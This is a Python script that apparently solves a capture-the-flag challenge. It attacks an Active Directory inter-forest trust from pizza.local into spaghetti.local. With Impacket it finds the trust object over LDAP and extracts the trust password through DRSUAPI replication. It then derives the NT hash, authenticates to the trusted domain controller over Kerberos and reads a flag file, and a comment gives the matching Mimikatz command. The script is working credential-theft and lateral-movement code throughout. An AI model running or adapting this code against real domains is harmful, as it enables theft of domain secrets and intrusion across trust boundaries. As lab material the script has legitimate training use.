#!/usr/bin/env python3

from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
from impacket.smbconnection import SMBConnection
from impacket.dcerpc.v5 import drsuapi
from impacket.structure import Structure
from impacket.smb3structs import FILE_READ_DATA
from impacket.ldap.ldap import LDAPConnection
from impacket.ldap.ldap import SimplePagedResultsControl
from impacket.ldap.ldapasn1 import SearchResultEntry

from Cryptodome.Hash import MD4

# This script extracts the trust password from the DC and uses it to authenticate to the target DC
# The same can be done using Mimikatz with the following command:
# - lsadump::trust /patch
# And then subsequently logging in with the trust password using explorer or net use

# Handed out to participants
DOMAIN = 'pizza.local'
USERNAME = 'Administrator'
PASSWORD = 'DoughN0tFai1!'
BASE_DN = 'DC=pizza,DC=local'

DC_HOST = '10.151.2.100'
TARGET_HOST = '10.151.2.101'
TARGET_DC = 'dc.spaghetti.local'

TARGET_DOMAIN = 'spaghetti.local'
TARGET_USERNAME = 'PIZZA$'

# Thanks to: https://github.com/synacktiv/ntdissector/blob/d6021443df8ba6409e324b308d610315a4e8d9a8/ntdissector/utils/trusts.py 
# 6.1.6.9.1 trustAuthInfo Attributes
class TRUST_AUTH_INFO(Structure):
    structure = (
        ("Count", "<L=0"),
        ("AuthenticationInformationOffSet", "<L=0"),
        ("PreviousAuthenticationInformationOffSet", "<L=0"),
        (
            "_AuthenticationInformationData",
            "_-AuthenticationInformationData",
            'self["PreviousAuthenticationInformationOffSet"] - self["AuthenticationInformationOffSet"]',
        ),
        ("AuthenticationInformationData", ":"),
        ("PreviousAuthenticationInformationData", ":"),
    )

    def __init__(self, data):
        Structure.__init__(self, data)

        self["AuthenticationInformation"] = []
        self["PreviousAuthenticationInformation"] = []

        for aif in ["AuthenticationInformation", "PreviousAuthenticationInformation"]:
            if len(self[f"{aif}Data"]) > 0:
                self[aif].append(LSAPR_AUTH_INFORMATION(self[f"{aif}Data"]))

                while len(self[aif][-1]["Remaining"]) > 0:
                    self[aif].append(LSAPR_AUTH_INFORMATION(self[aif][-1]["Remaining"]))

# 6.1.6.9.1.1 LSAPR_AUTH_INFORMATION
class LSAPR_AUTH_INFORMATION(Structure):
    structure = (
        ("LastUpdateTime", "<Q=0"),
        ("AuthType", "<L=0"),
        ("AuthInfoLength", "<L=0"),
        ("_AuthInfo", "_-AuthInfo", 'self["AuthInfoLength"]'),
        ("AuthInfo", ":"),
        ("_Padding", "_-Padding", "self['AuthInfoLength'] % 4"),
        ("Padding", ":"),
        ("Remaining", ":"),
    )

    __LSA_AUTH_INFORMATION_AUTH_TYPES = {
        0: "TRUST_AUTH_TYPE_NONE",
        1: "TRUST_AUTH_TYPE_NT4OWF",
        2: "TRUST_AUTH_TYPE_CLEAR",
        3: "TRUST_AUTH_TYPE_VERSION",
    }

    def __init__(self, data):
        Structure.__init__(self, data)

        self["AuthType"] = self.__LSA_AUTH_INFORMATION_AUTH_TYPES[self["AuthType"]]

# Patch Impacket to support trust attributes
NTDSHashes.ATTRTYP_TO_ATTID['trustPartner'] = '1.2.840.113556.1.4.133'
NTDSHashes.ATTRTYP_TO_ATTID['trustAuthIncoming'] = '1.2.840.113556.1.4.129'
NTDSHashes.ATTRTYP_TO_ATTID['trustAuthOutgoing'] = '1.2.840.113556.1.4.135'
NTDSHashes.NAME_TO_ATTRTYP['trustPartner'] = 0x90085
NTDSHashes.NAME_TO_ATTRTYP['trustAuthIncoming'] = 0x90081
NTDSHashes.NAME_TO_ATTRTYP['trustAuthOutgoing'] = 0x90087

# 1. Retrieve the trust GUID
ldapConnection = LDAPConnection('ldap://%s' % DC_HOST, BASE_DN, DC_HOST)
ldapConnection.login(USERNAME, PASSWORD, DOMAIN)

sc = SimplePagedResultsControl(size=100)
resp = ldapConnection.search(searchFilter="(objectClass=trustedDomain)", attributes=['objectGUID'], sizeLimit=0, searchControls=[sc])

trustGuid = None

for item in resp:
    if isinstance(item, SearchResultEntry):
        for attribute in item['attributes']:
            if str(attribute['type']) == 'objectGUID':
                trustGuid = attribute['vals'][0].asOctets()

if trustGuid is None:
    raise Exception('No trust found')

# 2. Retrieve the trust password
smbConnection = SMBConnection(DC_HOST, DC_HOST)
smbConnection.login(USERNAME, PASSWORD, DOMAIN)

ldapConnection.close()

remoteOps = RemoteOperations(smbConnection, False, DC_HOST, None)

dsName = drsuapi.DSNAME()
dsName['SidLen'] = 0
dsName['Guid'] = trustGuid
dsName['Sid'] = ''
dsName['NameLen'] = 0
dsName['StringName'] = ('\x00')

dsName['structLen'] = len(dsName.getData())

record = remoteOps._DRSGetNCChanges('', dsName)
replyVersion = 'V%d' % record['pdwOutVersion']
prefixTable = record['pmsgOut'][replyVersion]['PrefixTableSrc']['pPrefixEntry']

trustPassword = None

for attr in record['pmsgOut'][replyVersion]['pObjects']['Entinf']['AttrBlock']['pAttr']:
    try:
        attId = drsuapi.OidFromAttid(prefixTable, attr['attrTyp'])
        LOOKUP_TABLE = NTDSHashes.ATTRTYP_TO_ATTID
    except Exception as e:
        attId = attr['attrTyp']
        LOOKUP_TABLE = NTDSHashes.NAME_TO_ATTRTYP

    if attId == LOOKUP_TABLE['trustAuthOutgoing']:
        enc = b''.join(attr['AttrVal']['pAVal'][0]['pVal'])
        val = drsuapi.DecryptAttributeValue(remoteOps.getDrsr(), enc)
        authInfo = TRUST_AUTH_INFO(val)
        for info in authInfo['AuthenticationInformation']:
            if info['AuthType'] == 'TRUST_AUTH_TYPE_CLEAR':
                trustPassword = info['AuthInfo']

if trustPassword is None:
    raise Exception('No trust password found')

trustNtHash = MD4.new(trustPassword).hexdigest()

# 3. Retrieve the flag
targetSmbConnection = SMBConnection(TARGET_DC, TARGET_HOST)
targetSmbConnection.kerberosLogin(TARGET_USERNAME, None, TARGET_DOMAIN, '', trustNtHash, '', TARGET_HOST)

tid = targetSmbConnection.connectTree('Flag')
fid = targetSmbConnection.openFile(tid, 'flag.txt', FILE_READ_DATA)
flag = targetSmbConnection.readFile(tid, fid)

print(flag.decode())